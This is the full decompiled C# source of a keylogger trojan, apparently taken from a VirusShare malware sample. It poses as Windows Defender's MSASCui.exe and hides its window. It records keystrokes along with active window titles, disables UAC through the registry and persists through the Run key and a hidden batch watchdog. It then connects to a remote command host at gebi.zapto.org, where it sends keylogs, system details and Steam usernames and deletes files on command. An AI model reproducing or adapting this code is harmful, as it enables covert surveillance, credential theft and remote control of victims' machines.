// Decompiled with JetBrains decompiler
// Type: MSASCui.Form1
// Assembly: MSASCui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0EB0363B-A145-4FB4-99F4-D9A059C20475
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.cciq-bfc0cb7ef8fe04011213597be5b7a2bcbaee7399e7490b3766024e20624b83f3.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MSASCui
{
  public class Form1 : Form
  {
    private IContainer components;
    private TextBox textBox1;
    private Keylogger.Keylogger keylogger1;
    private string IP = "gebi.zapto.org";
    private int Port = 1234;
    private Thread connectthread;
    private Thread persisthread;
    private Thread recievethread;
    private TcpClient client = new TcpClient();
    private NetworkStream serverStream;
    private string logPath = Path.GetTempPath() + "\\log.txt";
    private string persisPath = Path.GetTempPath() + "\\persis.bat";
    private string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Defender\\MSASCui.exe";
    private string old;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.textBox1 = new TextBox();
      this.keylogger1 = new Keylogger.Keylogger();
      this.SuspendLayout();
      this.textBox1.Location = new Point(1, 1);
      this.textBox1.MaxLength = 999999;
      this.textBox1.Multiline = true;
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(14, 14);
      this.textBox1.TabIndex = 0;
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.keylogger1.Enabled = true;
      this.keylogger1.Keylogger_Mode = Keylogger.Keylogger.Keylogger_Modes.Hooks;
      this.keylogger1.VKCodeAsStringDown += new Keylogger.Keylogger.ValueChangedEventHandler(this.keylogger1_VKCodeAsStringDown);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(18, 16);
      this.Controls.Add((Control) this.textBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.KeyPreview = true;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "MSASCui";
      this.Load += new EventHandler(this.Form1_Load);
      this.Shown += new EventHandler(this.Form1_Shown);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        string str = Encoding.ASCII.GetString(File.ReadAllBytes(Application.ExecutablePath));
        this.IP = str.Substring(str.IndexOf("@GIK@") + 5).Split(':')[0];
        this.Port = Convert.ToInt32(str.Substring(str.IndexOf("@GIK@") + 5).Split(':')[1]);
      }
      catch
      {
        Environment.Exit(0);
      }
      if (!(Application.ExecutablePath == this.filePath))
      {
        try
        {
          Directory.CreateDirectory(Path.GetDirectoryName(this.filePath));
          File.Copy(Application.ExecutablePath, this.filePath);
        }
        catch
        {
        }
        Process.Start(this.filePath);
        Environment.Exit(0);
      }
      int num = 0;
      foreach (Process process in Process.GetProcessesByName("MSASCui"))
      {
        try
        {
          if (process.MainModule.FileName == this.filePath)
            ++num;
        }
        catch
        {
        }
      }
      if (num <= 1)
        return;
      Environment.Exit(0);
    }

    private void Form1_Shown(object sender, EventArgs e)
    {
      this.Hide();
      if (File.Exists(this.logPath))
        this.textBox1.Text = File.ReadAllText(this.logPath);
      foreach (Process process in Process.GetProcessesByName("cmd"))
        process.Kill();
      this.connectthread = new Thread(new ThreadStart(this.connect));
      this.connectthread.Start();
      this.persisthread = new Thread(new ThreadStart(this.persistent));
      this.persisthread.Start();
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey != null)
        {
          if (registryKey.GetValue("EnableLUA") != null)
            registryKey.SetValue("EnableLUA", (object) "0");
        }
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey == null || registryKey.GetValue("EnableLUA") == null)
          return;
        registryKey.SetValue("EnableLUA", (object) "0");
      }
      catch
      {
      }
    }

    private void keylogger1_VKCodeAsStringDown(string value, bool isChar)
    {
      string str = "";
      int num = 256;
      StringBuilder text = new StringBuilder(num);
      if (Form1.GetWindowText(Form1.GetForegroundWindow(), text, num) > 0 && this.old != text.ToString())
      {
        str = Environment.NewLine + "[--" + text.ToString() + "--]" + Environment.NewLine;
        this.old = text.ToString();
      }
      if (!isChar)
        value = !(value == "Back") ? (!(value == "Delete") ? (!(value == "Tab") ? (!(value == "Return") ? "" : "[R]") : "[T]") : "[D]") : "[B]";
      TextBox textBox1 = this.textBox1;
      textBox1.Text = textBox1.Text + str + value;
    }

    public void connect()
    {
      while (!this.client.Connected)
      {
        try
        {
          this.client.Connect(this.IP, this.Port);
        }
        catch
        {
        }
      }
      this.serverStream = this.client.GetStream();
      byte[] bytes = Encoding.ASCII.GetBytes(this.client.ToString() + "$");
      this.serverStream.Write(bytes, 0, bytes.Length);
      this.serverStream.Flush();
      this.recievethread = new Thread(new ThreadStart(this.recieve));
      this.recievethread.Start();
      this.connectthread.Abort();
    }

    private void recieve()
    {
      try
      {
        while (true)
        {
          this.serverStream = this.client.GetStream();
          byte[] numArray = new byte[10025];
          int receiveBufferSize = this.client.ReceiveBufferSize;
          this.serverStream.Read(numArray, 0, receiveBufferSize);
          string str = Encoding.ASCII.GetString(numArray);
          this.exe(str.Substring(0, str.IndexOf("$")));
        }
      }
      catch
      {
        this.client.Client.Close();
        this.client = new TcpClient();
      }
      this.connectthread = new Thread(new ThreadStart(this.connect));
      this.connectthread.Start();
      this.recievethread.Abort();
    }

    public void exe(string command)
    {
      try
      {
        if (command == "get")
        {
          if (this.textBox1.TextLength > 5000)
          {
            this.send("[GET]" + this.textBox1.Text.Substring(0, 5000));
            this.textBox1.Text = this.textBox1.Text.Remove(0, 5000);
          }
          else
          {
            this.send("[GET]" + this.textBox1.Text);
            this.textBox1.Text = "";
          }
        }
        else if (command == "info")
          this.send(this.getinfo());
        else if (command == "delete")
        {
          this.persisthread.Abort();
          try
          {
            Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("MSASCui", false);
          }
          catch
          {
          }
          if (File.Exists(this.logPath))
            File.Delete(this.logPath);
          File.WriteAllText(this.persisPath, ":n" + Environment.NewLine + "DEL \"" + this.filePath + "\"" + Environment.NewLine + "if exist \"" + this.filePath + "\" goto n" + Environment.NewLine + "DEL \"" + this.persisPath + "\"");
          Process.Start(new ProcessStartInfo(this.persisPath, "")
          {
            WindowStyle = ProcessWindowStyle.Hidden
          });
          Environment.Exit(0);
        }
        else
        {
          if (!(command.Substring(0, 6) == "remove"))
            return;
          string path = command.Contains(":\\") ? command.Substring(7) : Application.StartupPath + "\\" + command.Substring(7);
          if (File.Exists(path))
          {
            File.Delete(path);
            this.send(" Removed.");
          }
          else
            this.send(" Action failed.");
        }
      }
      catch
      {
        this.send(" Action failed.");
      }
    }

    public string getinfo()
    {
      string str1 = Environment.UserName + Environment.NewLine + Environment.MachineName + Environment.NewLine;
      OperatingSystem osVersion = Environment.OSVersion;
      switch (osVersion.Version.Major)
      {
        case 5:
          str1 += "Windows XP";
          break;
        case 6:
          if (osVersion.Version.Minor == 0)
            str1 += "Windows Vista";
          if (osVersion.Version.Minor == 1)
          {
            str1 += "Windows 7";
            break;
          }
          break;
        default:
          str1 += (string) (object) osVersion;
          break;
      }
      string str2 = str1 + Environment.NewLine;
      try
      {
        string str3 = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam", true).GetValue("SteamPath").ToString().Replace("/", "\\");
        str2 += "Steam Usernames:\n";
        StreamReader streamReader = new StreamReader(str3 + "\\config\\SteamAppData.vdf");
        string str4;
        while ((str4 = streamReader.ReadLine()) != null)
        {
          if (str4.StartsWith("\t\t\"User\""))
            str2 = str2 + str4.Substring(11).Replace("\"", "") + "\n";
        }
        streamReader.Close();
        str2 += str3;
      }
      catch
      {
      }
      return str2;
    }

    public void persistent()
    {
      while (true)
      {
        int num = 0;
        foreach (Process process in Process.GetProcessesByName("cmd"))
          ++num;
        if (num == 0)
        {
          File.WriteAllText(this.persisPath, ":n" + Environment.NewLine + "tasklist | find \"MSASCui.exe\" || " + this.filePath + Environment.NewLine + "ping -n 2 localhost" + Environment.NewLine + "goto n");
          Process.Start(new ProcessStartInfo(this.persisPath, "")
          {
            WindowStyle = ProcessWindowStyle.Hidden
          });
        }
        try
        {
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("MSASCui", (object) this.filePath);
        }
        catch
        {
        }
        Thread.Sleep(1000);
      }
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
      this.textBox1.Text = this.textBox1.Text.Replace("WWW", "W");
      this.textBox1.Text = this.textBox1.Text.Replace("AAA", "A");
      this.textBox1.Text = this.textBox1.Text.Replace("SSS", "S");
      this.textBox1.Text = this.textBox1.Text.Replace("DDD", "D");
      this.textBox1.Text = this.textBox1.Text.Replace("www", "w");
      this.textBox1.Text = this.textBox1.Text.Replace("aaa", "a");
      this.textBox1.Text = this.textBox1.Text.Replace("sss", "s");
      this.textBox1.Text = this.textBox1.Text.Replace("ddd", "d");
      this.textBox1.Text = this.textBox1.Text.Replace("   ", " ");
      File.WriteAllText(this.logPath, this.textBox1.Text);
    }

    private void send(string msg)
    {
      byte[] bytes = Encoding.ASCII.GetBytes(msg + "$");
      this.serverStream.Write(bytes, 0, bytes.Length);
      this.serverStream.Flush();
    }
  }
}
